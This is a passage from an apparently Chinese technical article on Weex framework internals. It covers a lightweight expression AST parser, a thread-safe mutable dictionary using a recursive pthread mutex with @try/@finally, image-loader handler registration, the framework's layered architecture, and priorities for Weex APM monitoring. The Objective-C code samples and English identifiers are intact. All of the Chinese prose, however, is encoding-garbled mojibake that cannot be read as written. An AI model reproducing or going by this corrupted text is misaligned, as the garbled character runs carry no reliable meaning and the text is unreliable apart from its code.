<li>æœ€ç»ˆç”Ÿæˆ AST æ ‘ï¼ˆå¦‚ä¹‹å‰çš„ç»“æ„ï¼‰ã€‚</li>
</ol>
<p>è¯­æ³•åˆ†æçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ï¼‰ï¼š</p>
<p>Weex é‡‡ç”¨ã€Œé€’å½’ä¸‹é™åˆ†ææ³•ã€ï¼ˆæœ€é€‚åˆæ‰‹å·¥å®ç°çš„è¯­æ³•åˆ†ææ–¹æ³•ï¼‰ï¼š</p>
<ol>
<li>ä¸ºæ¯ç§è¡¨è¾¾å¼ç±»å‹å®šä¹‰ä¸€ä¸ªã€Œè§£æå‡½æ•°ã€ï¼ˆå¦‚ <code>parseMemberExpression</code> è§£ææˆå‘˜è®¿é—®ã€<code>parseBinaryExpression</code> è§£æäºŒå…ƒè¿ç®—ï¼‰ï¼›</li>
<li>è§£æå‡½æ•°é€’å½’è°ƒç”¨ï¼šæ¯”å¦‚ <code>parseBinaryExpression</code> ä¼šè°ƒç”¨ <code>parseMemberExpression</code> è§£æå·¦å³æ“ä½œæ•°ï¼Œ<code>parseMemberExpression</code> ä¼šè°ƒç”¨ <code>parseIdentifier</code> è§£ææ ‡è¯†ç¬¦ï¼›</li>
<li>è¯­æ³•æ ¡éªŒï¼šå¦‚æœ Token åºåˆ—ä¸ç¬¦åˆè§„åˆ™ï¼ˆå¦‚ <code>user.name +</code> ç¼ºå°‘å³æ“ä½œæ•°ï¼‰ï¼Œä¼šæŠ›å‡ºã€Œè¯­æ³•é”™è¯¯ã€æ—¥å¿—ï¼Œç»ˆæ­¢è§£æã€‚</li>
</ol>
<h4 data-id="heading-58">3. AST èŠ‚ç‚¹å°è£…</h4>
<p>è½¬ä¸º Weex è‡ªå®šä¹‰çš„ <code>WXJSExpression</code>ã€‚è¯­æ³•åˆ†æç”Ÿæˆçš„æ˜¯ã€ŒæŠ½è±¡è¯­æ³•æ ‘ç»“æ„ã€ï¼ŒWeex ä¼šæŠŠè¿™ä¸ªç»“æ„å°è£…ä¸ºè‡ªå®šä¹‰çš„ <code>WXJSExpression</code> å­ç±»ï¼ˆå¯¹åº”ä¸åŒè¡¨è¾¾å¼ç±»å‹ï¼‰ï¼Œæ¯ä¸ªå­ç±»å­˜å‚¨è¯¥èŠ‚ç‚¹çš„å…³é”®ä¿¡æ¯ï¼ˆå¦‚è¿ç®—ç¬¦ã€å­èŠ‚ç‚¹ï¼‰ï¼Œä¾›åç»­ç”Ÿæˆ <code>WXDataBindingBlock</code> ä½¿ç”¨ã€‚</p>
<p>ç¤ºä¾‹å°è£…ï¼š</p>
<ul>
<li><code>WXJSMemberExpression</code> ç±»ï¼šå­˜å‚¨ <code>object</code>ï¼ˆå­èŠ‚ç‚¹ï¼Œå¦‚ <code>user</code>ï¼‰ã€<code>property</code>ï¼ˆå­èŠ‚ç‚¹ï¼Œå¦‚ <code>name</code>ï¼‰ã€<code>computed</code>ï¼ˆæ˜¯å¦æ˜¯è®¡ç®—å±æ€§ï¼Œå¦‚ <code>list[0]</code> ä¸º <code>YES</code>ï¼Œ<code>user.name</code> ä¸º <code>NO</code>ï¼‰ï¼›</li>
<li><code>WXJSBinaryExpression</code> ç±»ï¼šå­˜å‚¨ <code>left</code>ï¼ˆå·¦å­èŠ‚ç‚¹ï¼‰ã€<code>right</code>ï¼ˆå³å­èŠ‚ç‚¹ï¼‰ã€<code>operator_</code>ï¼ˆè¿ç®—ç¬¦å­—ç¬¦ä¸²ï¼Œå¦‚ <code>"+"</code>ï¼‰ï¼›</li>
<li>å­—é¢é‡ç±»ï¼ˆå¦‚ <code>WXJSStringLiteral</code>ï¼‰ï¼šå­˜å‚¨ <code>value</code>ï¼ˆå­—é¢é‡å€¼ï¼Œå¦‚ <code>?size=100</code>ï¼‰ã€‚</li>
</ul>
<p>è¿™äº›ç±»çš„å®šä¹‰åœ¨ Weex æºç çš„ <code>WXJSASTParser.h</code> ä¸­ï¼Œæœ¬è´¨æ˜¯ã€Œæ•°æ®å®¹å™¨ã€ï¼ŒæŠŠ AST ç»“æ„è½¬åŒ–ä¸º Objective-C ä»£ç å¯è®¿é—®çš„å¯¹è±¡ã€‚</p>
<p><code>WXJSASTParser</code> æœ¬è´¨ï¼šå®ƒä¸æ˜¯å®Œæ•´çš„ JS è§£æå™¨ï¼ˆä¸æ”¯æŒ <code>function</code>ã€<code>for</code> ç­‰å¤æ‚è¯­æ³•ï¼‰ï¼Œè€Œæ˜¯ã€Œä¸“é—¨ä¸º Weex ç»‘å®šè¡¨è¾¾å¼è®¾è®¡çš„è½»é‡è§£æå™¨ã€â€”â€” åªè§£æéœ€è¦çš„ JS è¡¨è¾¾å¼å­é›†ï¼ŒæŠŠå­—ç¬¦ä¸²è½¬ä¸ºç»“æ„åŒ–çš„ AST èŠ‚ç‚¹ï¼Œæœ€ç»ˆç›®çš„æ˜¯ã€Œè®© Native ä»£ç èƒ½é€’å½’éå†èŠ‚ç‚¹ï¼Œè®¡ç®—å‡ºè¡¨è¾¾å¼ç»“æœã€ï¼ˆå¦‚ <code>user.name + '?size=100'</code> â†’ <code>avatar.png?size=100</code>ï¼‰ã€‚</p>
<p>è¿™ç§ã€Œè‡ªå®šä¹‰è½»é‡è§£æå™¨ã€çš„è®¾è®¡ï¼Œæ—¢é¿å…äº†ä¾èµ–å®Œæ•´ JS å¼•æ“çš„ä½“ç§¯å’Œæ€§èƒ½å¼€é”€ï¼Œåˆèƒ½ç²¾å‡†é€‚é… Weex çš„ç»‘å®šéœ€æ±‚ï¼Œæ˜¯è·¨ç«¯æ¡†æ¶çš„å¸¸è§ä¼˜åŒ–æ€è·¯ã€‚</p>
<h2 data-id="heading-59">åã€å€¼å¾—å€Ÿé‰´çš„åœ°æ–¹</h2>
<h3 data-id="heading-60">1. WXThreadSafeMutableDictionary çº¿ç¨‹å®‰å…¨å­—å…¸</h3>
<p>Weex ä¸­çš„ WXThreadSafeMutableDictionary æä¾›äº†ä¸€ä¸ªçº¿ç¨‹å®‰å…¨çš„å­—å…¸ï¼Œå…¶æœ¬è´¨æ˜¯é€šè¿‡åŠ  pthread_muext_t é”æ¥ç»´æŠ¤å†…éƒ¨çš„ä¸€ä¸ªå­—å…¸çš„ã€‚
æ¯”å¦‚ä¸‹é¢çš„ä»£ç </p>
<p>åˆå§‹åŒ–é”ç›¸å…³çš„é…ç½®</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">@interface WXThreadSafeMutableDictionary ()
{
    NSMutableDictionary* _dict;
    pthread_mutex_t _safeThreadDictionaryMutex;
    pthread_mutexattr_t _safeThreadDictionaryMutexAttr;
}

@end

@implementation WXThreadSafeMutableDictionary

- (instancetype)initCommon
{
    self = [super init];
    if (self) {
        pthread_mutexattr_init(&amp;(_safeThreadDictionaryMutexAttr));
        pthread_mutexattr_settype(&amp;(_safeThreadDictionaryMutexAttr), PTHREAD_MUTEX_RECURSIVE); // must use recursive lock
        pthread_mutex_init(&amp;(_safeThreadDictionaryMutex), &amp;(_safeThreadDictionaryMutexAttr));
    }
    return self;
}

- (instancetype)init
{
    self = [self initCommon];
    if (self) {
        _dict = [NSMutableDictionary dictionary];
    }
    return self;
}
</code></pre>
<p>åœ¨å­—å…¸æ“ä½œçš„åœ°æ–¹ä½¿ç”¨é”</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">- (void)setObject:(id)anObject forKey:(id&lt;NSCopying&gt;)aKey
{
    id originalObject = nil; // make sure that object is not released in lock
    @try {
        pthread_mutex_lock(&amp;_safeThreadDictionaryMutex);
        originalObject = [_dict objectForKey:aKey];
        [_dict setObject:anObject forKey:aKey];
    }
    @finally {
        pthread_mutex_unlock(&amp;_safeThreadDictionaryMutex);
    }
    originalObject = nil;
}
</code></pre>
<p>è¿™ä¹ˆå†™çš„ä»·å€¼ï¼š<strong>è§£é”é€»è¾‘ã€Œç»å¯¹æ‰§è¡Œã€ï¼Œå½»åº•é¿å…æ­»é”</strong>
è¿™æ˜¯ <code>@try-finally</code> æœ€æ ¸å¿ƒçš„ä»·å€¼ â€”â€”æ— è®º try å—å†…å‘ç”Ÿä»€ä¹ˆï¼ˆæ­£å¸¸æ‰§è¡Œã€æå‰ returnã€æŠ›å¼‚å¸¸ï¼‰ï¼Œfinally å—çš„è§£é”é€»è¾‘ä¸€å®šä¼šæ‰§è¡Œ</p>
<p>å¯¹æ¯”æ—  try-finally çš„å†™æ³•</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">// Bad: è‹¥setObjectæŠ›å¼‚å¸¸ï¼Œunlockä¸ä¼šæ‰§è¡Œâ†’æ­»é”
pthread_mutex_lock(&amp;_mutex);
[_dict setObject:anObject forKey:aKey];
pthread_mutex_unlock(&amp;_mutex); 
</code></pre>
<p>é—®é¢˜ï¼š<code>[_dict setObject:anObject forKey:aKey]</code> å¯èƒ½æŠ›å¼‚å¸¸ï¼ˆæ¯”å¦‚ aKey = nil æ—¶ä¼šè§¦å‘ NSInvalidArgumentExceptionï¼‰ï¼Œè‹¥æ²¡æœ‰ finallyï¼Œé”ä¼šè¢«æ°¸ä¹…æŒæœ‰â†’å…¶ä»–çº¿ç¨‹è°ƒç”¨ lock æ—¶æ­»é”ï¼Œæ•´ä¸ªå­—å…¸æ— æ³•å†æ“ä½œã€‚</p>
<p>è®¾è®¡ä¼˜ç‚¹ï¼š</p>
<ul>
<li><code>@try-finallly</code>ï¼šå³ä½¿ try å†…é€»è¾‘å‡ºé”™ï¼Œfinally ä¹Ÿä¼šæ‰§è¡Œ pthread_mutex_unlockï¼Œä¿è¯é”æœ€ç»ˆé‡Šæ”¾ï¼Œè¿™æ˜¯<strong>çº¿ç¨‹å®‰å…¨çš„ã€Œå…œåº•ä¿éšœã€</strong></li>
<li>æ³¨æ„ï¼Œä¸æ˜¯ <code>try...catch...finally</code>: å¦‚æœåŠ äº† catch é€»è¾‘ï¼Œåˆ™å­—å…¸çš„ key ä¸º nil äº§ç”Ÿçš„å´©æºƒä¹Ÿä¼šè¢«æ•è·æ‰ï¼Œè¿™å±äºä¸ç¬¦åˆé¢„æœŸçš„è¡Œä¸ºã€‚å› ä¸º key ä¸º nil äº§ç”Ÿçš„åŸå› å¤ªå¤šäº†ï¼Œå¯èƒ½æ˜¯ä¸šåŠ¡ä»£ç å¼‚å¸¸ï¼Œä¹Ÿå¯èƒ½æ˜¯æ•°æ®å¼‚å¸¸ï¼Œä¹Ÿå¯èƒ½æ˜¯é€»è¾‘é”™è¯¯ï¼Œå¦‚æœä¸€åˆ€åˆ‡ç›´æ¥ç”¨ <code>try...catch...finally</code> æ•è·äº†å¼‚å¸¸ï¼Œä½†æ˜¯æ²¡æœ‰é…ç½®å¼‚å¸¸çš„æ”¶é›†ã€ä¸ŠæŠ¥ã€å¤„ç†é€»è¾‘ï¼Œå±äºè¾¹ç•Œä¸æ¸…æ™°ï¼Œæœ¬è´¨æ˜¯ä¸ºäº†è§£å†³åŠ è§£é”ä¸åŒ¹é…è€Œå¯èƒ½å¸¦æ¥çš„çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼Œå´"å¤šç®¡é—²äº‹"ï¼ŒæŠŠå­—å…¸ key ä¸º nil æœ¬è¯¥å‘ä¸Šè·‘çš„å¼‚å¸¸è€Œå¡ä½äº†ï¼ˆè¿™ä¸ªé—®é¢˜ä¸å†èµ˜è¿°ï¼Œæ˜¯ä¸€ä¸ªç»å…¸çš„ç­–ç•¥é—®é¢˜ï¼Œç«¯ä¸Šçš„å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œå®‰å…¨æ°”å«çš„â€œåšä¸ä¸åšâ€é—®é¢˜ï¼‰</li>
</ul>
<p>å»¶ä¼¸ï¼šèŠèŠç±»ä¼¼ç½‘æ˜“çš„å¤§ç™½è§£å†³æ–¹æ¡ˆæˆ–è€…ä¸šç•Œå…¶ä»–å…¬å¸ä¸­ï¼Œå®‰å…¨æ°”å«è™½ç„¶ä¿è¯äº†ä»£ç ä¸ crashï¼Œå½±å“ç”¨æˆ·ä½“éªŒï¼Œä½†æ˜¯æ¯”å¦‚æ•°ç»„æœ¬è¯¥è¶Šç•Œï¼Œç°åœ¨å´ä¸è¶Šç•Œï¼š</p>
<ol>
<li>å”¯ä¸€èƒ½åšçš„å°±æ˜¯è¿”å›ä¸€ä¸ªé”™è¯¯çš„å€¼ï¼Œæ¯”å¦‚æ•°ç»„é•¿åº¦ä¸º3ï¼Œè®¿é—®4ï¼Œç°åœ¨ä¸ crashï¼Œè¿”å›äº† 0 çš„å€¼ï¼Œé‚£æ˜¯ä¸æ˜¯äº§ç”Ÿäº†ä¸šåŠ¡å¼‚å¸¸ï¼Ÿæ¯”å¦‚å•†å“ä»·æ ¼</li>
<li>ä¸ crashï¼Œä¹Ÿä¸è¿”å›é”™è¯¯ä½ç½®çš„å€¼ï¼Œç±»ä¼¼ç»™ä¸€ä¸ªå›è°ƒï¼Œå‘Šè¯‰ä¸šåŠ¡æ–¹å‡ºç°äº†å¼‚å¸¸ï¼Œå¯ä»¥åšä¸€äº›ä¸šåŠ¡å±‚é¢çš„æé†’æˆ–è€…é…ç½®(æ¯”å¦‚å¼€å‘é˜¶æ®µå•†å“å¡ç‰‡çš„ä»·æ ¼ Label æ˜¾ç¤ºï¼šå•†å“ä»·æ ¼è·å–é”™è¯¯ï¼Œæ•°ç»„è¶Šç•Œ)ï¼ŒåŒæ—¶äº§ç”Ÿçš„å¼‚å¸¸æ¡ˆå‘ç°åœºä¿¡æ¯å’Œå…¶ä»–çš„ä¸€äº›æ•°æ®ä¼šä¸ŠæŠ¥ï¼Œç”¨äº APM å¹³å°å»åˆ†æå’Œå®šä½ã€‚</li>
</ol>
<p>ä½†è¿™ä¹Ÿäº§ç”Ÿä¸€ä¸ªé—®é¢˜ï¼Œç±»ä¼¼æ•°ç»„è¶Šç•Œçš„åœºæ™¯ï¼Œå¯èƒ½10000æ¬¡é‡Œé¢9999æ¬¡éƒ½æ­£å¸¸ï¼Œåªæœ‰1æ¬¡å¼‚å¸¸ï¼Œä¸šåŠ¡å¼€å‘ä¸ºäº†è¿™ä¸‡åˆ†ä¹‹ä¸€å‡ºç°çš„å¼‚å¸¸ï¼Œè¿˜éœ€è¦å†™ä¸€äº›å¼‚å¸¸å¤„ç†çš„é€»è¾‘ï¼ˆæ¯”å¦‚å•†å“å¡ç‰‡å±•ç¤ºä»·æ ¼è·å–é”™è¯¯ï¼Œæ•°ç»„è¶Šç•Œï¼‰ã€‚é‚£å­—å…¸çš„ key ä¸º nil å‘¢ï¼Ÿé™¤æ³•çš„åˆ†æ¯ä¸º0å‘¢ï¼Ÿè¯¸å¦‚æ­¤ç±»ï¼Œç±»ä¼¼ä¹è§‚é”å’Œæ‚²è§‚é”çš„åœºæ™¯</p>
<p>ç›¸å…³é—®é¢˜çš„æ€è€ƒå¯ä»¥æŸ¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://link.juejin.cn?target=.%2F1.148.md" target="_blank" title="./1.148.md" ref="nofollow noopener noreferrer">å®‰å…¨æ°”å«</a></p>
<ul>
<li>WXHandlerFactoryï¼šWeex æ ¸å¿ƒçš„ã€Œå¤„ç†å™¨å·¥å‚ã€ï¼Œè´Ÿè´£ç®¡ç†æ‰€æœ‰åè®®ï¼ˆå¦‚å›¾ç‰‡åŠ è½½ã€ç½‘ç»œè¯·æ±‚ã€å­˜å‚¨ç­‰ï¼‰çš„å®ç°ç±»æ³¨å†Œ / æŸ¥æ‰¾ï¼›</li>
<li>WXImgLoaderProtocolï¼šWeex å®šä¹‰çš„ã€Œå›¾ç‰‡åŠ è½½åè®®ã€ï¼Œä»…å£°æ˜æ¥å£ï¼ˆä¸‹è½½ã€å–æ¶ˆã€ç¼“å­˜ç­‰ï¼‰ï¼Œä¸åŒ…å«å…·ä½“å®ç°ã€‚</li>
</ul>
<p>Weex æ”¯æŒä¸šåŠ¡å±‚è‡ªå®šä¹‰å›¾ç‰‡åŠ è½½é€»è¾‘ï¼ˆæ¯”å¦‚ç»Ÿä¸€ç”¨é¡¹ç›®çš„å›¾ç‰‡ç¼“å­˜åº“ã€æ·»åŠ ä¸‹è½½æ‹¦æˆªã€åŸ‹ç‚¹ç­‰ï¼‰ï¼Œæ­¤æ—¶è‡ªå®šä¹‰å®ç°ç±»ä¼šæ›¿ä»£é»˜è®¤å®ç°ï¼Œæˆä¸ºä¸‹è½½æ‰§è¡Œè€…ï¼š
æ­¥éª¤ 1ï¼šä¸šåŠ¡å±‚åˆ›å»ºç±»ï¼ˆå¦‚ MyCustomImgLoaderï¼‰ï¼Œéµå¾ª WXImgLoaderProtocolï¼Œå®ç° wx_loadImageWithURL: ç­‰åè®®æ–¹æ³•ï¼ˆå†…éƒ¨å¯è°ƒç”¨ SDWebImage/AFNetworking ç­‰å®Œæˆä¸‹è½½ï¼‰ï¼›
æ­¥éª¤ 2ï¼šå°†è‡ªå®šä¹‰ç±»æ³¨å†Œåˆ° WXHandlerFactoryï¼š</p>
<pre><code class="hljs language-Objective-C" lang="Objective-C">[WXHandlerFactory registerHandler:[MyCustomImgLoader new] forProtocol:@protocol(WXImgLoaderProtocol)];
</code></pre>
<p>æ­¥éª¤ 3ï¼šæ­¤æ—¶ [WXHandlerFactory handlerForProtocol:@protocol(WXImgLoaderProtocol)] ä¼šè¿”å› MyCustomImgLoader å®ä¾‹ï¼Œæ‰€æœ‰å›¾ç‰‡ä¸‹è½½ç”±è¯¥ç±»è´Ÿè´£</p>
<h3 data-id="heading-61">2. è®¾è®¡åˆ†å±‚åˆç†</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[å¼€å‘è€…ç¼–å†™çš„ .we/.vue æ–‡ä»¶] --&gt; B[Transformer&lt;br/&gt;è½¬æ¢JS Bundle];
    B --&gt; C[JS Framework&lt;br/&gt;è§£æå¹¶ç®¡ç†Virtual DOM];
    C -- é€šè¿‡JS Bridgeå‘é€æ¸²æŸ“æŒ‡ä»¤ --&gt; D[Native SDK&lt;br/&gt;æ¸²æŸ“å¼•æ“];
    D --&gt; E[iOS/Android/Web åŸç”Ÿè§†å›¾];
    
    C -- æ”¯æŒå¤šç§DSL --&gt; F[Vue.js];
    C -- æ”¯æŒå¤šç§DSL --&gt; G[Raxï¼ˆç±»Reactï¼‰];
    D -- åŸç”Ÿèƒ½åŠ›æ‰©å±• --&gt; H[è‡ªå®šä¹‰Component];
    D -- åŸç”Ÿèƒ½åŠ›æ‰©å±• --&gt; I[è‡ªå®šä¹‰Module];
</code></pre>
<p>Weex æœ€æ ¸å¿ƒçš„è®¾è®¡æ˜¯å°†æ•´ä¸ªæ¡†æ¶æ¸…æ™°åœ°åˆ†ä¸ºï¼š<strong>è¯­æ³•å±‚ï¼ˆDSLï¼‰</strong>ã€<strong>ä¸­é—´å±‚ï¼ˆJS Frameworkï¼‰<strong>å’Œ</strong>æ¸²æŸ“å±‚ï¼ˆNative SDKï¼‰</strong></p>
<p>è¿™ç§æ¸²æŸ“å¼•æ“å’Œè¯­æ³•å±‚ DSL åˆ†ç¦»çš„è®¾è®¡ï¼Œå¯ä»¥ä½¿å¾—ä¸Šå±‚ DSL æ–¹ä¾¿æ‹“å±• Vueã€Rax å†™æ³•ï¼Œä¸‹å±‚æ¸²æŸ“å¼•æ“å¯ä»¥ä¿æŒè¾ƒå¥½çš„ç¨³å®šæ€§ã€‚ä¸ºäº†ç”Ÿæ€çš„æ‹“å±•æä¾›äº†æå¤§çš„ä¾¿æºæ€§ã€‚</p>
<h3 data-id="heading-62">3. å¯æ‰©å±•çš„ç»„ä»¶ä¸æ¨¡å—ç³»ç»Ÿ</h3>
<p>Weex é€šè¿‡<code>WXSDKEngine.registerComponent()</code> å’Œ <code>registerModule()</code> æ–¹æ³•ï¼Œå…è®¸å¼€å‘è€…æ‰©å±•åŸç”Ÿç»„ä»¶ ï¼ˆUI Componentï¼‰å’Œæ¨¡å—ï¼ˆLogin Moduleï¼‰ã€‚è¿™å¥—æœºåˆ¶è®¾è®¡å¾—è¶³å¤Ÿåº•å±‚å’Œé€šç”¨ï¼Œä½¿å¾— Weex å¯ä»¥ç”±å¼€å‘è€…æ¥æ³¨å†Œï¼Œç”±å…¬å¸å†…çš„ä½“éªŒè®¾è®¡ä¸­å¿ƒè§„èŒƒæ¥è½åœ°çš„ç»„ä»¶ã€‚ä»¥åŠä¸€äº›åŸºç¡€èƒ½åŠ›ã€‚è¿™æ ·å­ Weex å®˜æ–¹å·²ç»æä¾›äº†ä¸€äº›åŠŸèƒ½å¼ºå¤§çš„ç­‹éª¨ï¼Œæˆ‘ä»¬åœ¨å…¶ä¹‹ä¸Šå¯ä»¥æä¾›æ›´ç¬¦åˆéœ€æ±‚çš„å¤–è¡¨å’Œæ›´æœ‰åŠ›é‡çš„ä¸€å—æ‰‹è‡‚è‚Œè‚‰ã€‚</p>
<p>è™½ç„¶äº‹åè§†è§’æ¥çœ‹ï¼ŒWeexã€RNã€Flutterï¼Œç”šè‡³æ˜¯æ›´æ—©çš„ã€è®¾è®¡å®Œå–„çš„ Hybrid éƒ½æœ‰è¯¥èƒ½åŠ›ã€‚ä½†è¿™å¯¹äºè¿œå¤æ—¶æœŸçš„ Weex æ¥è¯´ï¼Œè¿˜æ˜¯å¯åœˆå¯ç‚¹çš„ã€‚</p>
<h3 data-id="heading-63">4.  è½»é‡ JSBundle + å¢é‡æ›´æ–°æ”¯æŒ</h3>
<p>Weex çš„ JSBundle ä»…åŒ…å«ä¸šåŠ¡é€»è¾‘å’Œç»„ä»¶æè¿°ï¼Œæ¡†æ¶ä»£ç ï¼ˆVue å†…æ ¸ã€Weex åŸºç¡€ APIï¼‰å†…ç½®åœ¨åŸç”Ÿ SDK ä¸­ï¼Œå› æ­¤ Bundle ä½“ç§¯æå°ï¼›åŒæ—¶æ”¯æŒå°† Bundle æ‹†åˆ†ä¸º â€œåŸºç¡€åŒ…ï¼ˆå…¬å…±é€»è¾‘ï¼‰+ ä¸šåŠ¡åŒ…ï¼ˆé¡µé¢é€»è¾‘ï¼‰â€ï¼Œå®ç°å¢é‡æ›´æ–°ã€‚</p>
<p>è§£å†³äº†è·¨ç«¯æ¡†æ¶ â€œé¦–å±åŠ è½½æ…¢â€ çš„ç—›ç‚¹ï¼ˆå° Bundle åŠ è½½æ›´å¿«ï¼‰ï¼ŒåŒæ—¶å¢é‡æ›´æ–°é™ä½äº†å‘å¸ƒæˆæœ¬ã€‚</p>
<h2 data-id="heading-64">åä¸€ã€Weex APM</h2>
<h3 data-id="heading-65">1. å†å²èƒŒæ™¯</h3>
<p>Weex æ˜¯è¯¸å¤šå¹´å‰çš„äº§ç‰©ï¼Œéƒ¨åˆ†ä¸šåŠ¡çº¿ç”¨ Weex å†™äº†éƒ¨åˆ†åŠŸèƒ½æ¨¡å—ï¼Œæˆ–è€…æ˜¯æŸå‡ ä¸ªé¡µé¢ï¼Œæˆ–è€…æ˜¯æŸä¸ªäºŒçº§ã€ä¸‰çº§ä¸šåŠ¡ SDK çš„é¡µé¢ã€‚ä½†å¯ä»¥ç¡®å®šçš„æ˜¯ï¼š</p>
<ul>
<li>21å¹´å°±å®Œæˆäº† Flutter çš„åŸºå»ºå¼€å‘ï¼ˆå¯¹é½ Native çš„ UI ç»„ä»¶åº“ï¼Œéµå¾ªä½“éªŒè®¾è®¡å¹³å°äº§å‡ºçš„é›†å›¢ UI æ ‡å‡†ï¼›åšäº† Flutter çš„å¤§é‡ pluginã€æ‰“åŒ…æ„å»ºå¹³å°ã€æ—¥å¿—åº“ã€ç½‘ç»œåº“ã€æ¢ç…§ç¯ã€APM SDKã€çƒ­ä¿®å¤èƒ½åŠ›ç­‰ï¼‰ã€‚æ–°ä¸šåŠ¡çš„å®ç°åªä¼šåœ¨ Native å’Œ Flutter ä¸Šè€ƒè™‘</li>
<li>Weex ä¸šåŠ¡ä»£ç åŸºæœ¬ä¸Šæ˜¯å­˜é‡çš„</li>
<li>Weex ä»£ç æ²¡æœ‰ bug å°±ä¸å»ä¿®æ”¹ï¼›æœ‰ç‰ˆæœ¬è¿­ä»£ï¼Œä¹‹å‰æ˜¯ Weex å®ç°çš„ï¼Œæœ¬æ¬¡åªåšç®€å• UI å¢åˆ æˆ–å­—æ®µè°ƒæ•´ï¼Œä¹Ÿæ˜¯ä¼šä¿®æ”¹ä¸€ä¸‹ã€‚åˆæ¬¡ä¹‹å¤–ä¸ä¿®æ”¹ Weex ä»£ç </li>
</ul>
<p>æ‰€ä»¥åƒ Native ä¸€æ ·å»å…¨é¢ç›‘æ§æ€§èƒ½ã€ç½‘ç»œã€crashã€å¼‚å¸¸ã€ç™½å±ã€é¡µé¢åŠ è½½è€—æ—¶ç­‰ç»´åº¦çš„è¯ï¼ŒROI æ˜¯å¾ˆä½çš„ã€‚é‚£ä¹ˆå°±éœ€è¦åˆ¶å®šä¸€äº›ç­–ç•¥å»æœ‰é’ˆå¯¹æ€§çš„ç›‘æ§é«˜ä¼˜é—®é¢˜ã€‚</p>
<p>Weex çš„å¼‚å¸¸æ¯”è¾ƒæœ‰ç‰¹ç‚¹ï¼Œæ¯”å¦‚åœ¨é¡µé¢çš„æ¨¡ç‰ˆä»£ç ä¸­ç»‘å®šäº† data ä¸­çš„ä¸€ä¸ªå¯¹è±¡ï¼Œæ­¤æ—¶å¯¹è±¡å¯èƒ½å¹¶æ²¡æœ‰å€¼ï¼Œè€Œæ˜¯ä¾èµ–åç»­çš„ç½‘ç»œè¯·æ±‚å®Œæˆï¼Œå¯¹è±¡æ‰æœ‰äº†å…·ä½“çš„å€¼ data æ”¹å˜ï¼Œæ•°æ®é©±åŠ¨ï¼Œé¡µé¢å†æ¬¡ renderã€‚æ‰€ä»¥ç›‘æ§ä»£ç ä¼šè®¤ä¸ºç¬¬ä¸€æ¬¡ render çš„æ—¶å€™è®¿é—®å¯¹è±¡ä¸å­˜åœ¨çš„å±æ€§ã€‚
çœŸæ­£æœ‰é—®é¢˜çš„ä»£ç å’Œä¸å½±å“ä¸šåŠ¡çš„å¼‚å¸¸ä¿¡æ¯ï¼Œéƒ½ä¼šè¢« Vue å®˜æ–¹è®¤ä¸ºæ˜¯å¼‚å¸¸ã€‚åŸºäºè¿™æ ·çš„èƒŒæ™¯ï¼Œæˆ‘ä»¬æ— æ³• pick å‡ºçœŸæ­£å¼‚å¸¸æˆ–è€…æ˜¯å¼€å‘è€…åˆ¤ç©ºä»£ç æ²¡å†™å¥½çš„é—®é¢˜ã€‚åŸºäºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦åšä¸€äº›çº¦å®šå’Œæ ‡å‡†ã€‚</p>
<h3 data-id="heading-66">2. ä¼˜å…ˆçº§æƒè¡¡æ ‡å‡†</h3>
<p>è¿™æ—¶å€™å°±éœ€è¦æ‘’å¼ƒç¨‹åºå‘˜è§†è§’ï¼ˆä¸ç„¶ä¼šé™·å…¥å•¥æ•°æ®éƒ½æƒ³ç»Ÿè®¡ï¼Œå¯èƒ½æ˜¯æ´ç™–ã€å¯èƒ½æ˜¯è¿½æ±‚ï¼‰ï¼Œä½†ä» ROI è§’åº¦å‡ºå‘ï¼Œæˆ‘ä»¬å°±éœ€è¦åˆ‡æ¢åˆ°ç”¨æˆ·è§†è§’ã€‚</p>
<p>å‡è®¾ä½ æ˜¯ä¸€ä¸ªç”¨æˆ·ï¼Œä»€ä¹ˆæ ·çš„æƒ…å†µä»£è¡¨ä¸šåŠ¡å¼‚å¸¸ï¼Œå¯¹æˆ‘ä»¬çš„ç”¨æˆ·æ¥è¯´æ¯”è¾ƒç—›å‘¢ï¼Ÿ</p>
<ul>
<li>é¡µé¢ç™½å±äº†ï¼Œçœ‹éƒ½çœ‹ä¸åˆ°äº†ï¼Œåˆ«è¯´ä½ ä»¬çš„ App ä¸ºæˆ‘èµ‹èƒ½è§£å†³ç”¨æˆ·ç—›ç‚¹äº†</li>
<li>ç¨å¾®å¥½ç‚¹ï¼Œå¯ä»¥çœ‹åˆ°é¡µé¢äº†ï¼Œä½†æ˜¯æŸä¸€ä¸ªåŒºåŸŸæ˜¯ç™½å±çš„ã€‚æ¯”å¦‚ï¼šè¯¥é¡µé¢å¤§éƒ¨åˆ†åœ¨å±•ç¤ºå•†å“ä»·æ ¼ã€å•†å“æ•°é‡ã€å•†å“æŠ˜æ‰£ä»·ã€å•†å“æŠ˜æ‰£ä¿¡æ¯ã€ä¸‹é¢åº”è¯¥æ˜¯æœ‰ä¸ªâ€œç¡®è®¤æ”¯ä»˜â€æŒ‰é’®ï¼Œä½†æ˜¯æ­¤å¤„å°±æ˜¯ç©ºç™½ï¼Œç‚¹ä¹Ÿç‚¹ä¸äº†ã€‚</li>
